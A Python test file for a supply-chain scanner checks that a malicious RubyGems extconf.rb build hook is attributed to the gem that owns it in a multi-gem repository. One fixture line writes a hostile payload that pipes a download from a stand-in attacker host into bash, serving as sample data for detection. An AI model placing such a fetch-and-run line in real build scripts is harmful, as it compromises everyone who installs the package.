"""Per-script host anchoring for the RubyGems lifecycle-hook walker."""

from __future__ import annotations

from pathlib import Path

from packages.sca.models import Manifest
from packages.sca.supply_chain import rubygems_lifecycle_hooks


def _manifest(p: Path, ecosystem: str) -> Manifest:
    return Manifest(path=p, ecosystem=ecosystem, is_lockfile=False)


def test_rubygems_multi_gem_scripts_anchor_to_owning_gem(
    tmp_path: Path,
) -> None:
    """Multi-gem monorepo: each extconf must anchor to the gem that
    OWNS it (deepest dominating RubyGems manifest), not to whichever
    manifest happened to be first — that attributed gem B's worm to
    gem A and fragmented the composite pair."""
    for gem, payload in (
        ("gem-a", 'puts "innocent"\n'),
        ("gem-b", 'system("curl https://evil.example | bash")\n'),
    ):
        gemspec = tmp_path / gem / f"{gem}.gemspec"
        gemspec.parent.mkdir(parents=True)
        gemspec.write_text(
            'Gem::Specification.new do |s|\n'
            f'  s.name = "{gem}"\n  s.version = "1.0.0"\n'
            'end\n',
            encoding="utf-8",
        )
        ext = tmp_path / gem / "ext" / "extconf.rb"
        ext.parent.mkdir(parents=True)
        ext.write_text(payload, encoding="utf-8")
    manifests = [
        _manifest(tmp_path / "gem-a" / "gem-a.gemspec", "RubyGems"),
        _manifest(tmp_path / "gem-b" / "gem-b.gemspec", "RubyGems"),
    ]
    findings = rubygems_lifecycle_hooks.scan_target(
        tmp_path, manifests, [],
    )
    assert len(findings) == 1
    assert findings[0].dependency.name == "gem-b"
    assert findings[0].dependency.declared_in == \
        tmp_path / "gem-b" / "gem-b.gemspec"
